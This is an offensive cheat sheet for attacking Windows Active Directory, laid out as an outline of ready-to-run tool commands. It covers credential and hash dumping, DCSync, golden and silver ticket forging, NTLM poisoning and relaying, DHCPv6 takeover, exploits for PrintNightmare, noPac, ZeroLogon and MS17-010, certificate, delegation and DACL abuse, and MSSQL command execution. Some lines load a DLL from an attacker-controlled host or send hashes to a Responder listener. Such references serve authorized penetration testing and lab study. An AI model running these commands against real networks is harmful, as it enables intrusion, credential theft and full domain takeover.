# Active Directory
*   [Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/)
*   [KB Realm Configuration](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
    *   `addhost [IP] [DOMAIN]` → `addhost [IP] [DC_HOSTNAME]` → Repeat for every domain
    *   `krbconf()     [DOMAIN] [DC_NETBIOS_NAME]`                     → [Add Multiple Domains](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
*   Authentication
    *   Password
        *   NXC           → `-u [USER] -p [PASS] -d [DOMAIN] [--local-auth]` → Add `-k` if `STATUS_NOT_SUPPORTED` 
        *   Impacket → `[DOMAIN]/[USER]:[PASS]@[IP]`
    *   User Hashes
        *   NXC                                   → `-u [USER] -H [HASH] -d [DOMAIN] [--local-auth]` → Add `-k` if `STATUS_NOT_SUPPORTED` 
        *   Impacket                         → `[DOMAIN]/[USER]@[IP] -hashes [HASH]`
        *   Password Conversion  → `iconv -f ASCII -t UTF-16LE <(printf "[PASS]") | openssl dgst -md4`
        *   Cracking                          → `hashcat -m 1000`
    *   Service Hashes
        *   `ticketer.py -nthash [SERVICE_HASH] -domain-sid [SID] -domain [DOMAIN] -dc-ip [DC_IP] -spn [SPN] Administrator`
        *   Get SID                            → `nxc ldap [DC_IP] --kdcHost [DC_FQDN] -k [AUTH_STRING] --get-sid`
        *   Password Conversion  → `iconv -f ASCII -t UTF-16LE <(printf "[PASS]") | openssl dgst -md4`
        *   Cracking                          → `hashcat -m 1000`
        *   Export Ticket                  → Impersonate Service Administrator + [SPN Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#abusing-service-tickets)
    *   KB Tickets
        *   Load Ticket              → `export KRB5CCNAME=[TICKET.ccache]`
        *   NXC                            → `--kdcHost [DC_FQDN] --use-kcache -d [DOMAIN] [--local-auth]` 
        *   Impacket                  → `[DOMAIN]/[USER]@[IP] -k -no-pass`
        *   Win/Lin Convert     → `ticketConverter.py [KIRBI/CCACHE_IN] [KIRBI/CCACHE_OUT]`
        *   Ticket Request       → `getTGT.py [AUTH_STRING]`
    *   RDP
        *   `xfreerdp /u:[USER] /p:'[PASS]' /v:[IP] [/pth:HASH] [--local-auth] +clipboard` 
        *   Enable NTLM          → `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
        *   RDP Group              → `net localgroup "Remote Desktop Users" [USER] /add`
    *   WinRM
        *   `evil-winrm -i [IP] -u [USER] [-p/H] [PASS/HASH]`  → Check `menu` + Commands
        *   CCACHE Auth    → `-i [DC_FQDN] -r [DOMAIN]`
        *   WinRM Group    → `net localgroup "Remote Management Users" [USER] /add` 
*   Local Admin
    *   Account Check
        *   `nxc [service] [IP] [ AUTH_STRING] [--local-auth]` → Check if `(Pwn3d!)` appears
    *   SMB RCE
        *   `nxc [IP] [AUTH_STRING] -x [CMD]`
        *   `nxc [IP] [AUTH_STRING] -X [PS_COMMAND] [--amsi-bypass /PATH/TO/PAYLOAD]`
    *   Hash Dumping
        *   `nxc smb [IP] [AUTH_STRING] -M lsassy -M nanodump -M ntdsutil`
        *   `nxc smb [IP] [AUTH_STRING] --lsa --dpapi --sam --ntds`
        *   `nxc smb [IP] [AUTH_STRING] --sccm [disk/wmi]`
        *   `nxc smb [IP] [AUTH_STRING] -M wifi -M keepass_discover -M veeam -M winscp -M vnc -M mremoteng -M rdcman -M teams_localdb -M security-questions`
    *   SMB / RPC Session
        *   `psexec.py   [AUTH_STRING] cmd.exe`
        *   `smbexec.py  [AUTH_STRING]`
        *   `atexec.py   [AUTH_STRING]`
        *   `wmiexec.py  [AUTH_STRING]`
        *   `dcomexec.py [AUTH_STRING] -object MMC20`
    *   Trust Escalations (Domain Admin)
        *   `nxc ldap [DC_IP] [AUTH_STRING] -M enum_trusts`
        *   [Child-Forest](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/trust-sid-hijacking/)
            *   `Get-DomainSID -Domain [CURRENT_DOMAIN]`
            *   `Get-DomainSID -Domain [FOREST_DOMAIN]`
            *   `lsadump::dcsync /dc:[CONTROLLER] /domain:[DOMAIN] /user:krbtgt`
            *   `kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN] /sid:[CURRENT_SID] /sids:[ROOT_SID]-519 /krbtgt:[HASH] /ptt`
            *   `lsadump::dcsync /domain:root.local /user:Administrator`
        *   [Cross-Forest](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/trust-ticket/)
            *   `lsadump::lsa /patch`
            *   `kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN] /sid:[CURRENT_SID] /rc4:[HASH] /service:krbtgt /target:[FOREST] /ticket:forest_ticket.kirbi`
            *   `.\asktgs.exe forest_ticket.kirbi CIFS/[FQDN_DC_OF_FOREST]`
            *   `.\kirbirator.exe lsa [GENERATED_TGS_FILE]`
*   SMB
    *   Null / Guest Binding
        *   `nxc smb [IP] -u '' -p ''`
        *   `nxc smb [IP] -u Guest -p ''`
    *   User Enumeration
        *   `nxc smb [IP] [AUTH_STRING] --users --groups --pass-pol`
        *   `nxc smb [IP] [AUTH_STRING] --rid-brute 10000`
    *   Shares Enumeration
        *   `nxc smb [IP] [AUTH_STRING] --shares`
        *   `smbclient -L \\[IP] [-U [USER%PASS]]`
        *   Data Access
            *   SMBClient Native         → `smbclient \\\\[IP]\\[SHARE] [-U [USER%PASS]]`
            *   Impacket Client            → `smbclient.py [AUTH_STRING]` → `help` / `shares`
            *   Upload Files                   → `put [SRC]`
            *   Recursive Download   → `nxc smb [IP] [AUTH_STRING] -M spider_plus -o DOWNLOAD_FLAG=True`
            *   Single Download          → `nxc smb [IP] [AUTH_STRING] --get-file '[FILE]' [OUT] --share "[SHARE]"`
            *   Local Mounting            → `mount -t cifs -o "username=[USER]" //[IP]/[SHARE] /mnt/[SHARE]`
        *   LLMNR
            *   [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft) → Share File Dropping
            *   `nxc smb [IP] [AUTH_STRING] -M slinky -o SERVER=[RESPONDER_IP]`
            *   `nxc smb [IP] [AUTH_STRING] -M scuffy -o SERVER=[RESPONDER_IP]`
            *   Cracking → `hashcat -m 5600`
    *   RPC Access
        *   Null / Guest Binding
            *   `rpcclient -U "%"      -N [IP]`
            *   `rpcclient -U "Guest%" -N [IP]`
        *   Enumeration
            *   `rpcclient -U '[USER]%[PASS]' [IP]`
            *   Queries
                *   `enumdomusers`   → `queryuser  [USERNAME]` + `querydispinfo`
                *   `enumdomgroups` → `querygroup [GROUP_NAME]`
                *   `getdompwinfo` / `enumprinters` / `querydominfo`
    *   GPP / LAPS / GMSA Read
        *   `nxc smb  [IP] [AUTH_STRING] -M gpp_password`
        *   `nxc smb  [IP] [AUTH_STRING] --laps`
        *   `nxc ldap [DC_IP] [AUTH_STRING] --gmsa`
    *   SCCM Abuse
        *   `sccmhunter.py smb -u [USER] -p [PASS] -d [DOMAIN] -dc-ip [DC_IP] -save`
        *   `sccmhunter.py show -all`
        *   [Admin Hunting](https://www.thehacker.recipes/ad/movement/sccm-mecm/lateral-movement)
        *   [Other Exploits](https://www.thehacker.recipes/ad/movement/sccm-mecm/privilege-escalation)
    *   DC Exploits
        *   `scan() smb [IP] [PORT]` → Exploit Research
        *   `nxc smb [IP] [AUTH_STRING] -M printnightmare -M spooler -M zerologon -M nopac -M smbghost -M ms17-010`
        *   [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675.git) → `CVE-2021-1675.py [AUTH_STRING] '\\[KALI_IP]\Share\[EVIL.dll]'` → MSFVenom / [AddUser Cross-Compile](https://github.com/newsoft/adduser)
        *   [NoPAC](https://github.com/Ridter/noPac.git)                  → `noPac.py [AUTH_STRING] --impersonate administrator -use-ldap -dump`
        *   MS17-010                → `use exploit/windows/smb/ms17_010_psexec`
        *   [MS14-068](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/CVE/MS14-068.md)             → Missing `KB3011780`
        *   [PrivExchange](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/PrivExchange/)     → User Shell with Exchange Mailbox
        *   [ZeroLogon](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/ZeroLogon/)
        *   SMBGhost
    *   NTLM Poisoning
        *   LLMNR
            *   `respond()`
            *   Web Exploits                      → LFI / XXE / SSRF / SQLi
            *   Phishing / Client Forms  → Responder Link / Bad-PDF / Bad-ODT / [NTLM\_Thef](https://github.com/Greenwolf/ntlm_theft) Office Files
            *   Cracking                              → `hashcat -m 5600`
        *   Unsigned Relaying
            *   `respond()`                                                                              → Set `HTTP/SMB = Off`
            *   `nxc smb [ALIVE_IPS] --gen-relay-list [OUT_FILE]` → List Vulnerable Servers
            *   `MultiRelay.py -t [VULN_SERVER_IP] -u ALL -d`
            *   `ntlmrelayx --no-http-server -smb2support -t [VULN_SERVER_IP]`
        *   DHCPv6 Takeover
            *   `sudo mitm6 -I [NIC] -d [DOMAIN]`
            *   `ntlmrelayx.py -6 -wh fakewpad.[DOMAIN] -t ldap://[DC_IP]:[PORT]`
        *   DNS Spoofing
            *   `dnstool.py -u '[DOMAIN\USER]' -p [PASSWORD] [DC_IP] -a add -r [NAME] -d [RESPONDER_IP] -t A`
            *   Passively Listen Hashes
        *   NTLM Coercion
            *   Check → `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus`
            *   Exploitation
                *   `respond()` / NTLMRelayx Listener
                *   `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus -o LISTENER=[RESPONDER_IP]` 
*   KB
    *   User Bruteforcing
        *   Wordlists → `usergen() [FULL_NAMES.txt]` / [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) / Seclists Xato-Net + `Names.txt`
        *   `kerbrute userenum -d [DOMAIN] [GENERATED_USERS.txt] --dc [DC_IP]`
    *   Roasting
        *   ASREP
            *   Try Both Techniques
            *   `nxc ldap [DC_IP] -u [VALID_USERS.txt] -p '' --asreproast --kdcHost [DOMAIN]`
            *   `nxc ldap [DC_IP] [AUTH_STRING] --asreproast --kdcHost [DOMAIN]`
            *   Cracking → `hashcat -m 18200`
        *   KBR
            *   Try Both Techniques
            *   `nxc ldap              [DC_IP] [AUTH_STRING] --kerberoasting --kdcHost [DOMAIN]`
            *   `GetUserSPNs.py        [DOMAIN]/ -no-preauth [ASREP_USERNAME] -usersfile [VALID_USERS.txt] -dc-ip [DC_IP]`
            *   Cracking → `hashcat -m 13100`
*   LDAP
    *   User Enumeration
        *   `nxc ldap [DC_IP] [AUTH_STRING] --query "(sAMAccountType=805306368)" "sAMAccountName description memberOf"`
        *   `ldeep [AUTH_STRING] -d [DOMAIN] -s ldap://[DC_IP] all [OUT_DIR]` → Full DB Dump + [Output Parsing](https://github.com/franc-pentest/ldeep)
    *   Certificate Abuse
        *   [ESC Exploitations](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
        *   Enumeration
            *   `nxc ldap [DC_IP]    [AUTH_STRING] -M adcs`
            *   `certipy-ad find     [AUTH_STRING] -scheme ldap -debug -dc-ip [DC_IP] -vulnerable -stdout`
            *   `certipy-ad template [AUTH_STRING] -template [TEMPLATE_NAME] -dc-ip [DC_IP]`
        *   Template Hijacking
            *   `certipy-ad template [AUTH_STRING] -template [TEMPLATE] -target [DC_HOSTNAME] -dc-ip [DC_IP]`
            *   `certipy-ad req      [AUTH_STRING] -ca [CA_NAME] -target [DC_HOSTNAME] -dc-ip [DC_IP] -template [TEMPLATE] -upn Administrator@[DOMAIN] -ns [DC_IP] -dns [DC_IP]`
            *   `certipy-ad auth -pfx [PFX_FILE] -dc-ip [DC_IP]`
        *   UPN Hijacking
            *   `certipy-ad account update [AUTH_STRING] -user [VULN_USER] -upn "Administrator" -dc-ip [DC_IP]`
            *   `certipy-ad req  [TARGET_AUTH_STRING] -target [DC_IP] -ca [CA_NAME] -template [TEMPLATE] -dc-ip [DC_IP]`
            *   `certipy-ad account update [AUTH_STRING] -user [VULN_USER] -upn "[VULN_USER]@[DOMAIN]" -dc-ip [DC_IP]`
            *   `certipy-ad auth -pfx      [PFX_FILE] -domain [DOMAIN] -dc-ip [DC_IP]`
        *   CVE-2022-26923
            *   `certipy account create [AUTH_STRING] -user [USER_TO_CREATE] -dns [DC_FQDN] -dc-ip [DC_IP]`
            *   `certipy req            [AUTH_STRING] -ca   [CA_NAME] -template [TEMPLATE]`
            *   `certipy auth -pfx      [OUTPUT.pfx] -dc-ip [DC_IP]`
            *   `secretsdump.py         [DOMAIN]/[DC_COMPUTER_NAME] -hashes [DC_COMPUTER_HASH]`
    *   [Delegation Abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)
        *   Unconstrained
            *   `nxc ldap [DC_IP] [AUTH_STRING] --trusted-for-delegation`
            *   `Invoke-Rubeus -Command "dump /nowrap"`
            *   `Invoke-Rubeus -Command "monitor /monitorinterval:10 /targetuser:dc1$ /nowrap"`
        *   Constrained
            *   `nxc ldap [DC_IP] [AUTH_STRING] --find-delegation`
            *   `getST.py [AUTH_STRING] -dc-ip [DC_IP] -spn [TRUSTED_SPN] -impersonate Administrator`
            *   [Without Protocol Transition](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
        *   Resource Delegation
            *   `nxc ldap [DC_IP] [AUTH_STRING] --find-delegation`
            *   Computer Account
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add computer "FAKE$" "password123"`
                *   `nxc smb [DC_IP] -u "FAKE$" -p password123 --delegate Administrator --self [CREDENTIAL_DUMPING_FLAGS]`
            *   User Account
                *   `rbcd.py [AUTH_STRING] -delegate-from '[USER]' -delegate-to '[DC_FQDN]$' -dc-ip '[DC_IP]' -action 'write'`
                *   `nxc smb [DC_IP] -u [USER] -p/H [PASS/HASH] --delegate Administrator [CREDENTIAL_DUMPING_FLAGS]`
    *   [DACL Abuse](https://www.thehacker.recipes/ad/movement/dacl/)
        *   Enumeration
            *   `bloodhound-python -u [USER] -p [PASS] [--hashes HASH] -ns [DC_IP] -d [DOMAIN] -c all --zip [--dns-tcp]`
            *   Errors                          → Select Individual Collection Methods / Attempt Blind Exploitation
            *   Mark Owned Users → Check Outbound Controls / All Shortest Paths → Exploit Privilege
        *   Exploitation
            *   Targeted Roasting
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add uac [USER] -f DONT_REQ_PREAUTH`
                *   `targetedKerberoast.py [AUTH_STRING] -dc-ip [DC_IP] -d [DOMAIN]`
            *   Set Ownership
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] set owner "[OBJECT]" "[USER]"`
            *   Set GenericAll / FullControl
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add genericall "[OBJECT]" “[USER]”`
                *   `dacledit.py -action 'write' -rights 'FullControl' -principal '[USER] -target '[OBJECT]' [AUTH_STRING]`
            *   Shadow Hash Steal 
                *   `certipy-ad shadow auto [AUTH_STRING] -account "[TARGET_USER]" -dc-ip [DC_IP]`
            *   Password Reset
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] set password "[TARGET_USER]" "[PASS]"`
            *   Add Group Member
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add groupMember "[GROUP]" “[USER]”`
            *   Set DCSync
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add dcsync "[USER]"`
                *   `secretsdumpy.py [AUTH_STRING]` → On DC
            *   GPO Escalation
                *   `pygpoabuse [AUTH_STRING] -gpo-id "[GPO_ID]"`
                *   From Local Session → `gpupdate /force`
            *   Enable Account
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] remove uac [USER] -f ACCOUNTDISABLE`
*   MSSQL
    *   `mssqclient.py [AUTH_STRING] [-windows-auth]`
    *   User Permissions
        *   `SELECT * FROM fn_my_permissions(NULL, 'SERVER');`
        *   `SELECT IS_SRVROLEMEMBER ('sysadmin');`
        *   Check Admin / Read / Write / Directives
    *   DB Dumping
        *   `enum_db` → `use [DB_NAME]`
        *   `SELECT TABLE_NAME FROM [DB].INFORMATION_SCHEMA.TABLES;`
        *   `SELECT * FROM [TABLE];`
    *   LLMNR
        *   `EXEC master..xp_dirtree '\\[RESPONDER_IP]\x'`
        *   Cracking        → `hashcat -m 5600`
        *   Service Hash → Impersonate Administrator + RCE
    *   User Impersonation
        *   `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
        *   `EXECUTE AS LOGIN = '[PRIVILEGED_USER]'`
        *   NXC
            *   `nxc mssql [IP] [AUTH_STRING] -M mssql_priv`
            *   `nxc mssql [IP] [AUTH_STRING] -M mssql_priv -o ACTION=privesc`
            *   `nxc mssql [IP] [AUTH_STRING] -q ‘[MSSQL_QUERY]’`
    *   OS Read
        *   Download               → `nxc mssql [IP] [AUTH_STRING] --get-file C:\\[SRC] [OUT]`
        *   Directory Listing   → `EXEC master..xp_dirtree [OS_DIR]`
        *   File Read                 → `SELECT * FROM OPENROWSET(BULK N'[PATH\\TO\\FILE]', SINGLE_CLOB) AS Contents`
    *   Linked Instances
        *   `SELECT * FROM master..sysservers;` → Check Instances with `IsRemote = 0`
        *   `EXECUTE('[MSSQL_QUERY]') AT [[INSTANCE]]`
        *   Queries
            *   `EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = password'') AT [[INSTANCE]]`
            *   `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [[INSTANCE]]`
    *   RCE / File Upload (Admin)
        *   `enable_xp_cmdshell` → `xp_cmdshell [CMD]` 
        *   `nxc mssql [IP] [AUTH_STRING] --put-file [SRC] C:\\Windows\\Temp\\[OUT]`
        *   `nxc mssql [IP] [AUTH_STRING] [-x/-X] [CMD/PS_COMMAND]`